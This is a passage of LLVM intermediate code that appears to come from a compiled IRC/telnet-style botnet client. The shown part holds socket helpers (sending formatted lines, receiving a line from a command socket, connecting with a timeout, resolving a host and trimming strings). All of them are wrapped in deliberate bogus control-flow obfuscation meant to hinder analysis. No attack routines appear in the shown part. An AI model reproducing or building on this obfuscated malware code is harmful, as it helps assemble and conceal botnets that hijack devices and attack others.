  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %16, align 4
  %37 = load i8*, i8** %14, align 8
  call void @free(i8* %37) #3
  %38 = load i32, i32* %16, align 4
  %39 = load i32, i32* @x.35
  %40 = load i32, i32* @y.36
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %2
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca [1 x %struct.__va_list_tag], align 16
  %52 = alloca i32, align 4
  store i32 %0, i32* %47, align 4
  store i8* %1, i8** %48, align 8
  %53 = call noalias i8* @malloc(i64 2048) #3
  store i8* %53, i8** %49, align 8
  %54 = load i8*, i8** %49, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 1, i1 false)
  %55 = load i8*, i8** %49, align 8
  store i8* %55, i8** %50, align 8
  %56 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %57 = bitcast %struct.__va_list_tag* %56 to i8*
  call void @llvm.va_start(i8* %57)
  %58 = load i8*, i8** %48, align 8
  %59 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %60 = call i32 @print(i8** %49, i8* %58, %struct.__va_list_tag* %59)
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %62 = bitcast %struct.__va_list_tag* %61 to i8*
  call void @llvm.va_end(i8* %62)
  %63 = load i8*, i8** %50, align 8
  %64 = load i8*, i8** %50, align 8
  %65 = call i64 @strlen(i8* %64) #9
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 10, i8* %66, align 1
  %67 = load i32, i32* %47, align 4
  %68 = load i8*, i8** %50, align 8
  %69 = load i8*, i8** %50, align 8
  %70 = call i64 @strlen(i8* %69) #9
  %71 = call i64 @send(i32 %67, i8* %68, i64 %70, i32 16384)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %52, align 4
  %73 = load i8*, i8** %50, align 8
  call void @free(i8* %73) #3
  %74 = load i32, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10

; <label>:28:                                     ; preds = %10
  br label %29

; <label>:29:                                     ; preds = %66, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

; <label>:48:                                     ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  %50 = load i32, i32* @x.37
  %51 = load i32, i32* @y.38
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %48
  %58 = load i32, i32* @x.37
  %59 = load i32, i32* @y.38
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %66, label %69

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* %5, align 4
  %68 = add nsw i32 %67, -1
  store i32 %68, i32* %5, align 4
  br label %29

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* %4, align 4
  store i32 %70, i32* %3, align 4
  br label %71

; <label>:71:                                     ; preds = %originalBBpart28, %69
  %72 = load i32, i32* %3, align 4
  %73 = load i32, i32* %5, align 4
  %74 = icmp sle i32 %72, %73
  br i1 %74, label %75, label %106

; <label>:75:                                     ; preds = %71
  %76 = load i8*, i8** %2, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = load i8*, i8** %2, align 8
  %82 = load i32, i32* %3, align 4
  %83 = load i32, i32* %4, align 4
  %84 = sub nsw i32 %82, %83
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %81, i64 %85
  store i8 %80, i8* %86, align 1
  br label %87

; <label>:87:                                     ; preds = %75
  %88 = load i32, i32* @x.37
  %89 = load i32, i32* @y.38
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %87
  %96 = load i32, i32* %3, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %3, align 4
  %98 = load i32, i32* @x.37
  %99 = load i32, i32* @y.38
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br label %71

; <label>:106:                                    ; preds = %71
  %107 = load i8*, i8** %2, align 8
  %108 = load i32, i32* %3, align 4
  %109 = load i32, i32* %4, align 4
  %110 = sub nsw i32 %108, %109
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %107, i64 %111
  store i8 0, i8* %112, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %48
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %87
  %113 = load i32, i32* %3, align 4
  %_ = shl i32 %113, 1
  %_2 = sub i32 0, %113
  %gen = add i32 %_2, 1
  %_3 = shl i32 %113, 1
  %_4 = sub i32 0, %113
  %gen5 = add i32 %_4, 1
  %_6 = shl i32 %113, 1
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #3
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* @x.39
  %16 = load i32, i32* @y.40
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* @x.39
  %25 = load i32, i32* @y.40
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %23

originalBBalteredBB:                              ; preds = %originalBB, %14
  %32 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.41
  %5 = load i32, i32* @y.42
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.41
  %33 = load i32, i32* @y.42
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.41
  %42 = load i32, i32* @y.42
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %49, i64 0, i64 0
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %50) #3, !srcloc !1
  %52 = extractvalue { i64, i64* } %51, 0
  %53 = extractvalue { i64, i64* } %51, 1
  %54 = trunc i64 %52 to i32
  store i32 %54, i32* %18, align 4
  %55 = ptrtoint i64* %53 to i64
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %19, align 4
  %57 = load i32, i32* @x.41
  %58 = load i32, i32* @y.42
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* %13, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %71 = load i32, i32* %13, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %79, i32* %20, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %134

; <label>:81:                                     ; preds = %65
  br label %82

; <label>:82:                                     ; preds = %113, %81
  %83 = load i32, i32* %21, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %117

; <label>:85:                                     ; preds = %82
  %86 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %86, align 8
  %87 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %87, align 8
  br label %88

; <label>:88:                                     ; preds = %85
  %89 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %90 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 0
  %91 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %90) #3, !srcloc !2
  %92 = extractvalue { i64, i64* } %91, 0
  %93 = extractvalue { i64, i64* } %91, 1
  %94 = trunc i64 %92 to i32
  store i32 %94, i32* %22, align 4
  %95 = ptrtoint i64* %93 to i64
  %96 = trunc i64 %95 to i32
  store i32 %96, i32* %23, align 4
  br label %97

; <label>:97:                                     ; preds = %88
  %98 = load i32, i32* %13, align 4
  %99 = srem i32 %98, 64
  %100 = zext i32 %99 to i64
  %101 = shl i64 1, %100
  %102 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %103 = load i32, i32* %13, align 4
  %104 = sdiv i32 %103, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %102, i64 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %107, %101
  store i64 %108, i64* %106, align 8
  %109 = load i32, i32* %13, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %111, i32* %20, align 4
  %112 = icmp sle i32 %111, 0
  br i1 %112, label %113, label %116

; <label>:113:                                    ; preds = %97
  %114 = load i32, i32* %21, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %21, align 4
  br label %82

; <label>:116:                                    ; preds = %97
  br label %117

; <label>:117:                                    ; preds = %116, %82
  %118 = load i32, i32* @x.41
  %119 = load i32, i32* @y.42
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  %126 = load i32, i32* @x.41
  %127 = load i32, i32* @y.42
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %134

; <label>:134:                                    ; preds = %originalBBpart28, %65
  store i32 0, i32* %26, align 4
  %135 = load i8*, i8** %14, align 8
  store i8* %135, i8** %25, align 8
  br label %136

; <label>:136:                                    ; preds = %originalBBpart231, %134
  %137 = load i32, i32* @x.41
  %138 = load i32, i32* @y.42
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* %15, align 4
  %146 = add nsw i32 %145, -1
  store i32 %146, i32* %15, align 4
  %147 = icmp sgt i32 %145, 1
  %148 = load i32, i32* @x.41
  %149 = load i32, i32* @y.42
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br i1 %147, label %156, label %205

; <label>:156:                                    ; preds = %originalBBpart217
  %157 = load i32, i32* @x.41
  %158 = load i32, i32* @y.42
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %156
  %165 = load i32, i32* @KadenCommStock, align 4
  %166 = call i64 @recv(i32 %165, i8* %24, i64 1, i32 0)
  %167 = icmp ne i64 %166, 1
  %168 = load i32, i32* @x.41
  %169 = load i32, i32* @y.42
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %167, label %176, label %178

; <label>:176:                                    ; preds = %originalBBpart221
  %177 = load i8*, i8** %25, align 8
  store i8 0, i8* %177, align 1
  store i32 -1, i32* %12, align 4
  br label %224

; <label>:178:                                    ; preds = %originalBBpart221
  %179 = load i8, i8* %24, align 1
  %180 = load i8*, i8** %25, align 8
  %181 = getelementptr inbounds i8, i8* %180, i32 1
  store i8* %181, i8** %25, align 8
  store i8 %179, i8* %180, align 1
  %182 = load i8, i8* %24, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 10
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %178
  br label %205

; <label>:186:                                    ; preds = %178
  %187 = load i32, i32* @x.41
  %188 = load i32, i32* @y.42
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %186
  %195 = load i32, i32* %26, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %26, align 4
  %197 = load i32, i32* @x.41
  %198 = load i32, i32* @y.42
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart231, label %originalBB23alteredBB

originalBBpart231:                                ; preds = %originalBB23
  br label %136

; <label>:205:                                    ; preds = %185, %originalBBpart217
  %206 = load i32, i32* @x.41
  %207 = load i32, i32* @y.42
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %205
  %214 = load i8*, i8** %25, align 8
  store i8 0, i8* %214, align 1
  %215 = load i32, i32* %26, align 4
  store i32 %215, i32* %12, align 4
  %216 = load i32, i32* @x.41
  %217 = load i32, i32* @y.42
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %224

; <label>:224:                                    ; preds = %originalBBpart235, %176
  %225 = load i32, i32* %12, align 4
  ret i32 %225

originalBBalteredBB:                              ; preds = %originalBB, %3
  %226 = alloca i32, align 4
  %227 = alloca i32, align 4
  %228 = alloca i8*, align 8
  %229 = alloca i32, align 4
  %230 = alloca %struct.fd_set, align 8
  %231 = alloca %struct.timeval, align 8
  %232 = alloca i32, align 4
  %233 = alloca i32, align 4
  %234 = alloca i32, align 4
  %235 = alloca i32, align 4
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca i8, align 1
  %239 = alloca i8*, align 8
  %240 = alloca i32, align 4
  store i32 %0, i32* %227, align 4
  store i8* %1, i8** %228, align 8
  store i32 %2, i32* %229, align 4
  %241 = load i8*, i8** %228, align 8
  %242 = load i32, i32* %229, align 4
  %243 = sext i32 %242 to i64
  call void @llvm.memset.p0i8.i64(i8* %241, i8 0, i64 %243, i32 1, i1 false)
  %244 = getelementptr inbounds %struct.timeval, %struct.timeval* %231, i32 0, i32 0
  store i64 30, i64* %244, align 8
  %245 = getelementptr inbounds %struct.timeval, %struct.timeval* %231, i32 0, i32 1
  store i64 0, i64* %245, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %246 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %247 = getelementptr inbounds [16 x i64], [16 x i64]* %246, i64 0, i64 0
  %248 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %247) #3, !srcloc !1
  %249 = extractvalue { i64, i64* } %248, 0
  %250 = extractvalue { i64, i64* } %248, 1
  %251 = trunc i64 %249 to i32
  store i32 %251, i32* %18, align 4
  %252 = ptrtoint i64* %250 to i64
  %253 = trunc i64 %252 to i32
  store i32 %253, i32* %19, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  %254 = load i32, i32* %15, align 4
  %_ = shl i32 %254, -1
  %_11 = sub i32 0, %254
  %gen = add i32 %_11, -1
  %_12 = sub i32 %254, -1
  %gen13 = mul i32 %_12, -1
  %_14 = sub i32 %254, -1
  %gen15 = mul i32 %_14, -1
  %255 = add nsw i32 %254, -1
  store i32 %255, i32* %15, align 4
  %256 = icmp sgt i32 %254, 1
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %156
  %257 = load i32, i32* @KadenCommStock, align 4
  %258 = call i64 @recv(i32 %257, i8* %24, i64 1, i32 0)
  %259 = icmp ne i64 %258, 1
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %186
  %260 = load i32, i32* %26, align 4
  %_24 = sub i32 0, %260
  %gen25 = add i32 %_24, 1
  %_26 = sub i32 0, %260
  %gen27 = add i32 %_26, 1
  %_28 = shl i32 %260, 1
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %26, align 4
  br label %originalBB23

originalBB33alteredBB:                            ; preds = %originalBB33, %205
  %262 = load i8*, i8** %25, align 8
  store i8 0, i8* %262, align 1
  %263 = load i32, i32* %26, align 4
  store i32 %263, i32* %12, align 4
  br label %originalBB33
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %212

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %203

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* @x.43
  %47 = load i32, i32* @y.44
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = call i32* @__errno_location() #10
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, 115
  %57 = load i32, i32* @x.43
  %58 = load i32, i32* @y.44
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %185

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.43
  %67 = load i32, i32* @y.44
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

